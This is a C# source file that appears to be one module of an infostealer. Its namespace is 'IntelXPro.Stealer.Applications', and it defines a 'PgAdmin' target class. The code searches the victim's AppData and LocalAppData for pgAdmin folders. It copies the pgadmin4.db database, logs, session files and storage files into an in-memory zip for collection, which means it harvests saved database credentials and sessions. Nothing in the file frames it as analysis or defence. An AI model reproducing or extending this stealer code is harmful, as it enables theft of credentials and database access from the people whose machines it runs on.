using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class PgAdmin : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "pgAdmin");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "pgAdmin");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "PgAdmin";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "pgadmin4.db",
                    "pgadmin4.log",
                    "sessions",
                    "storage"
                };

                foreach (string configItem in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configItem);
                    
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\PgAdmin\\{location}\\{configItem}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                    else if (Directory.Exists(fullPath))
                    {
                        string[] files = Directory.GetFiles(fullPath, "*.*", SearchOption.AllDirectories);
                        
                        foreach (string file in files)
                        {
                            string relativePath = file.Substring(fullPath.Length + 1);
                            string zipPath = $"Applications\\PgAdmin\\{location}\\{configItem}\\{relativePath}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }

                string[] versionDirs = Directory.GetDirectories(basePath, "pgAdmin *", SearchOption.TopDirectoryOnly);
                
                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    string dbFile = Path.Combine(versionDir, "pgadmin4.db");
                    if (File.Exists(dbFile))
                    {
                        string zipPath = $"Applications\\PgAdmin\\{location}\\{versionName}\\pgadmin4.db";
                        zip.AddFile(zipPath, File.ReadAllBytes(dbFile));
                        counterApplications.Files.Add(dbFile + " => " + zipPath);
                        foundData = true;
                    }

                    string sessionsPath = Path.Combine(versionDir, "sessions");
                    if (Directory.Exists(sessionsPath))
                    {
                        string[] sessionFiles = Directory.GetFiles(sessionsPath, "*.*", SearchOption.AllDirectories);
                        
                        foreach (string file in sessionFiles)
                        {
                            string relativePath = file.Substring(sessionsPath.Length + 1);
                            string zipPath = $"Applications\\PgAdmin\\{location}\\{versionName}\\sessions\\{relativePath}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string storagePath = Path.Combine(versionDir, "storage");
                    if (Directory.Exists(storagePath))
                    {
                        string[] storageFiles = Directory.GetFiles(storagePath, "*.*", SearchOption.AllDirectories);
                        
                        foreach (string file in storageFiles.Take(50))
                        {
                            string relativePath = file.Substring(storagePath.Length + 1);
                            string zipPath = $"Applications\\PgAdmin\\{location}\\{versionName}\\storage\\{relativePath}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
